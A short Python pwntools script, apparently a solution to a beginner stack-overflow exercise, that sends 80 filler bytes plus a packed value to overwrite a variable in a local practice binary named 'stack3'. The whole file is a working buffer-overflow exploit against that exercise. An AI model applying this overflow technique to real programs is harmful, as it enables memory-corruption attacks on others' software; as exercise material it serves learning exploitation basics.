#!/usr/bin/python3

from subprocess import *
from pwn import *
from struct import pack

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
	try:
		buf = 80
		buffer = b"A"*buf
		cookie = pack("<I", 0x01020005)
		print(cookie)
		payload = buffer+cookie
		print(payload)
		p = process('./stack3')
#		context.log_level = 'DEBUG'
		p.sendline(payload)
		print(p.recvline())
		print(p.recvline())
	except Exception as e:
		print(e)
